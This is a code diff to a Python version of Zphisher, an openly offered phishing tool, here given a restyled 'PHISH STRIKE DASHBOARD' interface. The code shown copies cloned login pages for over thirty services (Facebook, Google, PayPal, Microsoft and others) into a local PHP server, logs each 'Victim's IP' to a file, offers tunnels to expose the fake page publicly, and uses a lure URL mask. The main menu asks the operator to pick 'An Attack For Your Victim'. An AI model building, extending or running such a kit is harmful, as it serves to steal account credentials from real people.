@@ -12,20 +12,27 @@ import tarfile
 import re
 import json
 
+if sys.stdout.encoding != 'utf-8':
+    try:
+        sys.stdout.reconfigure(encoding='utf-8')
+    except AttributeError:
+        pass
+
 __version__ = "2.3.5"
 
 HOST = "127.0.0.1"
 PORT = "8080"
 
-# ANSI colors – Deep Blue Luxury Theme
-LIGHT1    = "\033[38;2;77;166;255m"   # Soft Neon Blue Glow
-LIGHT2    = "\033[38;2;30;144;255m"   # Electric Blue Accent
-MEDIUM    = "\033[38;2;10;31;68m"     # Royal Dark Blue
-PURPLE    = "\033[38;2;30;144;255m"   # Electric Blue Accent
-DARK      = "\033[38;2;2;11;26m"      # Midnight Blue
-PINK      = "\033[38;2;255;45;170m"   # Fuchsia Pink
+# ANSI colors – Cyber Dashboard Bold Theme
+LIGHT1    = "\033[1;38;2;0;255;255m"   # Neon Cyan (Bold)
+LIGHT2    = "\033[1;38;2;30;144;255m"  # Electric Blue (Bold)
+MEDIUM    = "\033[1;38;2;0;102;204m"   # Deep Azure (Bold)
+PURPLE    = "\033[1;38;2;157;0;255m"   # Neon Purple (Bold)
+DARK      = "\033[1;38;2;80;80;80m"     # Graphite (Bold)
+PINK      = "\033[1;38;2;255;45;170m"  # Neon Pink (Bold)
 RESET     = "\033[0m"
-WHITE     = "\033[37m"                 # white for menu numbers
+WHITE     = "\033[1;97m"                # Pure White (Bold)
+BOLD      = "\033[1m"
 
 
 BASE_DIR = os.path.dirname(os.path.realpath(__file__))
@@ -112,35 +119,43 @@ def check_status():
 
 
 def banner():
-    print(f"""{LIGHT1}   . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
-{LIGHT2}  ▄▄▄▄▄▄▄   ▄▄▄▄▄▄    ▄     ▄   ▄▄▄   ▄▄▄▄▄▄▄   ▄     ▄   ▄▄▄▄▄▄▄   ▄▄▄▄▄▄   
-{LIGHT2} █       █ █      █  █     █   █   █ █       █ █     █  █       █ █      █  
-{LIGHT2}       ▄▀  █▄▄▄▄▄▄▀  █▄▄▄▄▄█   █   █ ▀▄▄▄▄▄▄▄  █▄▄▄▄▄█  █▄▄▄▄▄    █▄▄▄▄▄▄▀  
-{MEDIUM}     ▄▀    █         █     █   █   █        █  █     █  █         █   ▀▄    
-{MEDIUM}   ▄▀▄▄▄▄▄ █         █     █ ▄█▄  ▄▄▄▄▄▄▄█ █     █  █▄▄▄▄▄▄▄  █     █   
-{MEDIUM}  ▀▀▀▀▀▀▀▀ ▀         ▀     ▀ ▀▀▀  ▀▀▀▀▀▀▀▀ ▀     ▀ ▀▀▀▀▀▀▀▀ ▀     ▀   
-{LIGHT1}   ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '
-{PINK}                                                 Version : {__version__}
-
-{PURPLE}[{LIGHT1}-{PURPLE}]{PINK} Tool Created by htr-tech (tahmid.rayat){RESET}""")
+    print(f"""{LIGHT1}  
+    {LIGHT2} ███████╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
+    {LIGHT2} ╚══███╔╝██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
+    {LIGHT1}   ███╔╝ ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
+    {LIGHT1}  ███╔╝  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
+    {MEDIUM} ███████╗██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
+    {MEDIUM} ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+    {PINK}                                          Version : {__version__}
+    {PURPLE} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    {PURPLE} [{LIGHT1}-{PURPLE}] {PINK}Cyber Security Dashboard | Developed by htr-tech{RESET}""")
 
 
 def banner_small():
-    print(f"""{LIGHT2}  ╒═══════════════════════════════════════════════╕
-  {LIGHT2}  Z P H I S H E R  {PINK}v{__version__}
-  {LIGHT2}╘═══════════════════════════════════════════════╛""")
+    print(f"""
+    {PURPLE} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    {LIGHT2} \x5b {LIGHT1}Z P H I S H E R {LIGHT2} \x5d {PINK}v{__version__} {DARK}| {MEDIUM}PHISH STRIKE DASHBOARD
+    {PURPLE} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 
 
 def dependencies():
-    print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Checking packages...")
-    if platform.system() == "Windows":
-        return
-    # Skipping deep package checks for python equivalent since python already has standard libs.
-    # PHP is required.
-    if shutil.which("php") is None:
-        print(
-            f"\n{DARK}[{WHITE}!{DARK}]{DARK} PHP is not installed. Please install it manually."
-        )
+    print(f"\n    {PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Validating environment...")
+    
+    # Check for PHP (Hard dependency)
+    php_path = shutil.which("php") or shutil.which("php.exe")
+    
+    if php_path is None:
+        print(f"\n    {DARK}\x5b{PINK}!{DARK}\x5d{PINK} CRITICAL ERROR: PHP NOT FOUND!")
+        print(f"    {DARK}\x5b{WHITE}-{DARK}\x5d{LIGHT2} PHP is required to run the local phishing server.")
+        print(f"    {DARK}\x5b{WHITE}-{DARK}\x5d{LIGHT2} Please install PHP and add it to your PATH.")
+        if platform.system() != "Windows":
+            print(f"    {DARK}\x5b{WHITE}-{DARK}\x5d{LIGHT1} Hint: Run 'sudo apt install php' (for Debian/Ubuntu)")
+        else:
+            print(f"    {DARK}\x5b{WHITE}-{DARK}\x5d{LIGHT1} Download: https://www.php.net/downloads.php")
+        print()
+        sys.exit(1)
+    
+    return php_path
 
 
 def download(url, output):
@@ -266,9 +281,9 @@ def about():
   KasRoudra, E343IO, sepp0, ThelinuxChoice,
   Yisus7u7
 
-{DARK}[{WHITE}00{DARK}]{LIGHT2} Main Menu     {DARK}[{WHITE}99{DARK}]{LIGHT2} Exit
 """)
-    reply = input(f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}")
+    print(f"    {DARK}\x5b{WHITE}00{DARK}\x5d{LIGHT2} Main Menu     {DARK}\x5b{WHITE}99{DARK}\x5d{LIGHT2} Exit\n")
+    reply = input(f"    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD} ")
     if reply in ["99"]:
         msg_exit()
     elif reply in ["0", "00"]:
@@ -308,8 +323,12 @@ def cusport():
 
 
 def setup_site():
-    print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Setting up server...{LIGHT1}")
+    print(f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{MEDIUM} Setting up server...{LIGHT1}")
     site_dir = os.path.join(".sites", website)
+    if not os.path.isdir(site_dir):
+        print(f"\n    {DARK}\x5b{PINK}!{DARK}\x5d{PINK} Error: Site directory {website} not found!")
+        return
+
     for item in os.listdir(site_dir):
         s = os.path.join(site_dir, item)
         d = os.path.join(".server/www", item)
@@ -317,10 +336,17 @@ def setup_site():
             shutil.copytree(s, d, dirs_exist_ok=True)
         else:
             shutil.copy2(s, d)
+    
     shutil.copy2(".sites/ip.php", ".server/www/ip.php")
-    print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Starting PHP server...{LIGHT1}")
+    
+    php_bin = shutil.which("php") or shutil.which("php.exe")
+    if not php_bin:
+        print(f"\n    {DARK}\x5b{PINK}!{DARK}\x5d{PINK} PHP binary lost! Re-check your installation.")
+        sys.exit(1)
+
+    print(f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{MEDIUM} Starting PHP server...{LIGHT1}")
     subprocess.Popen(
-        ["php", "-S", f"{HOST}:{PORT}"],
+        [php_bin, "-S", f"{HOST}:{PORT}"],
         cwd=".server/www",
         stdout=subprocess.DEVNULL,
         stderr=subprocess.DEVNULL,
@@ -335,8 +361,8 @@ def capture_ip():
         for line in lines:
             if "IP: " in line:
                 ip = line.split("IP: ")[1].strip()
-        print(f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Victim's IP : {MEDIUM}{ip}")
-        print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Saved in : {LIGHT2}auth/ip.txt")
+        print(f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Victim's IP : {WHITE}{ip}")
+        print(f"    {DARK}\x5b{WHITE}-{DARK}\x5d{MEDIUM} Saved in    : {LIGHT2}auth/ip.txt")
         with open("auth/ip.txt", "a") as f:
             f.writelines(lines)
 
@@ -606,12 +632,12 @@ def tunnel_menu():
     os.system("cls" if os.name == "nt" else "clear")
     banner_small()
     print(f"""
-{DARK}[{WHITE}01{DARK}]{LIGHT2} Localhost
-{DARK}[{WHITE}02{DARK}]{LIGHT2} Cloudflared  {DARK}[{LIGHT2}Auto Detects{DARK}]
-{DARK}[{WHITE}03{DARK}]{LIGHT2} LocalXpose   {DARK}[{LIGHT2}NEW! Max 15Min{DARK}]
-""")
+    {DARK}\x5b{WHITE}01{DARK}\x5d{LIGHT2} Localhost
+    {DARK}\x5b{WHITE}02{DARK}\x5d{LIGHT2} Cloudflared  {DARK}\x5b{LIGHT2}Auto Detects{DARK}\x5d
+    {DARK}\x5b{WHITE}03{DARK}\x5d{LIGHT2} LocalXpose   {DARK}\x5b{LIGHT2}NEW! Max 15Min{DARK}\x5d
+    """)
     reply = input(
-        f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select a port forwarding service : {MEDIUM}"
+        f"    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select a port forwarding service : {MEDIUM}{BOLD} "
     )
     if reply in ["1", "01"]:
         start_localhost()
@@ -747,24 +773,24 @@ def main_menu():
     os.system("cls" if os.name == "nt" else "clear")
     banner()
     print(f"""
-{DARK}[{WHITE}::{DARK}]{LIGHT2} Select An Attack For Your Victim {DARK}[{WHITE}::{DARK}]{LIGHT2}
+    {DARK}\x5b{WHITE}::{DARK}\x5d{LIGHT2} Select An Attack For Your Victim {DARK}\x5b{WHITE}::{DARK}\x5d{LIGHT2}
 
-{DARK}[{WHITE}01{DARK}]{LIGHT2} Facebook      {DARK}[{WHITE}11{DARK}]{LIGHT2} Twitch       {DARK}[{WHITE}21{DARK}]{LIGHT2} DeviantArt
-{DARK}[{WHITE}02{DARK}]{LIGHT2} Instagram     {DARK}[{WHITE}12{DARK}]{LIGHT2} Pinterest    {DARK}[{WHITE}22{DARK}]{LIGHT2} Badoo
-{DARK}[{WHITE}03{DARK}]{LIGHT2} Google        {DARK}[{WHITE}13{DARK}]{LIGHT2} Snapchat     {DARK}[{WHITE}23{DARK}]{LIGHT2} Origin
-{DARK}[{WHITE}04{DARK}]{LIGHT2} Microsoft     {DARK}[{WHITE}14{DARK}]{LIGHT2} Linkedin     {DARK}[{WHITE}24{DARK}]{LIGHT2} DropBox	
-{DARK}[{WHITE}05{DARK}]{LIGHT2} Netflix       {DARK}[{WHITE}15{DARK}]{LIGHT2} Ebay         {DARK}[{WHITE}25{DARK}]{LIGHT2} Yahoo		
-{DARK}[{WHITE}06{DARK}]{LIGHT2} Paypal        {DARK}[{WHITE}16{DARK}]{LIGHT2} Quora        {DARK}[{WHITE}26{DARK}]{LIGHT2} Wordpress
-{DARK}[{WHITE}07{DARK}]{LIGHT2} Steam         {DARK}[{WHITE}17{DARK}]{LIGHT2} Protonmail   {DARK}[{WHITE}27{DARK}]{LIGHT2} Yandex			
-{DARK}[{WHITE}08{DARK}]{LIGHT2} Twitter       {DARK}[{WHITE}18{DARK}]{LIGHT2} Spotify      {DARK}[{WHITE}28{DARK}]{LIGHT2} StackoverFlow
-{DARK}[{WHITE}09{DARK}]{LIGHT2} Playstation   {DARK}[{WHITE}19{DARK}]{LIGHT2} Reddit       {DARK}[{WHITE}29{DARK}]{LIGHT2} Vk
-{DARK}[{WHITE}10{DARK}]{LIGHT2} Tiktok        {DARK}[{WHITE}20{DARK}]{LIGHT2} Adobe        {DARK}[{WHITE}30{DARK}]{LIGHT2} XBOX
-{DARK}[{WHITE}31{DARK}]{LIGHT2} Mediafire     {DARK}[{WHITE}32{DARK}]{LIGHT2} Gitlab       {DARK}[{WHITE}33{DARK}]{LIGHT2} Github
-{DARK}[{WHITE}34{DARK}]{LIGHT2} Discord       {DARK}[{WHITE}35{DARK}]{LIGHT2} Roblox 
+    {DARK}\x5b{WHITE}01{DARK}\x5d{LIGHT2} Facebook      {DARK}\x5b{WHITE}11{DARK}\x5d{LIGHT2} Twitch       {DARK}\x5b{WHITE}21{DARK}\x5d{LIGHT2} DeviantArt
+    {DARK}\x5b{WHITE}02{DARK}\x5d{LIGHT2} Instagram     {DARK}\x5b{WHITE}12{DARK}\x5d{LIGHT2} Pinterest    {DARK}\x5b{WHITE}22{DARK}\x5d{LIGHT2} Badoo
+    {DARK}\x5b{WHITE}03{DARK}\x5d{LIGHT2} Google        {DARK}\x5b{WHITE}13{DARK}\x5d{LIGHT2} Snapchat     {DARK}\x5b{WHITE}23{DARK}\x5d{LIGHT2} Origin
+    {DARK}\x5b{WHITE}04{DARK}\x5d{LIGHT2} Microsoft     {DARK}\x5b{WHITE}14{DARK}\x5d{LIGHT2} Linkedin     {DARK}\x5b{WHITE}24{DARK}\x5d{LIGHT2} DropBox	
+    {DARK}\x5b{WHITE}05{DARK}\x5d{LIGHT2} Netflix       {DARK}\x5b{WHITE}15{DARK}\x5d{LIGHT2} Ebay         {DARK}\x5b{WHITE}25{DARK}\x5d{LIGHT2} Yahoo		
+    {DARK}\x5b{WHITE}06{DARK}\x5d{LIGHT2} Paypal        {DARK}\x5b{WHITE}16{DARK}\x5d{LIGHT2} Quora        {DARK}\x5b{WHITE}26{DARK}\x5d{LIGHT2} Wordpress
+    {DARK}\x5b{WHITE}07{DARK}\x5d{LIGHT2} Steam         {DARK}\x5b{WHITE}17{DARK}\x5d{LIGHT2} Protonmail   {DARK}\x5b{WHITE}27{DARK}\x5d{LIGHT2} Yandex			
+    {DARK}\x5b{WHITE}08{DARK}\x5d{LIGHT2} Twitter       {DARK}\x5b{WHITE}18{DARK}\x5d{LIGHT2} Spotify      {DARK}\x5b{WHITE}28{DARK}\x5d{LIGHT2} StackoverFlow
+    {DARK}\x5b{WHITE}09{DARK}\x5d{LIGHT2} Playstation   {DARK}\x5b{WHITE}19{DARK}\x5d{LIGHT2} Reddit       {DARK}\x5b{WHITE}29{DARK}\x5d{LIGHT2} Vk
+    {DARK}\x5b{WHITE}10{DARK}\x5d{LIGHT2} Tiktok        {DARK}\x5b{WHITE}20{DARK}\x5d{LIGHT2} Adobe        {DARK}\x5b{WHITE}30{DARK}\x5d{LIGHT2} XBOX
+    {DARK}\x5b{WHITE}31{DARK}\x5d{LIGHT2} Mediafire     {DARK}\x5b{WHITE}32{DARK}\x5d{LIGHT2} Gitlab       {DARK}\x5b{WHITE}33{DARK}\x5d{LIGHT2} Github
+    {DARK}\x5b{WHITE}34{DARK}\x5d{LIGHT2} Discord       {DARK}\x5b{WHITE}35{DARK}\x5d{LIGHT2} Roblox 
 
-{DARK}[{WHITE}99{DARK}]{LIGHT2} About         {DARK}[{WHITE}00{DARK}]{LIGHT2} Exit
-""")
-    reply = input(f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}")
+    {DARK}\x5b{WHITE}99{DARK}\x5d{LIGHT2} About         {DARK}\x5b{WHITE}00{DARK}\x5d{LIGHT2} Exit
+    """)
+    reply = input(f"    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD} ")
 
     opts = {
         "4": ("microsoft", "https://unlimited-onedrive-space-for-free"),
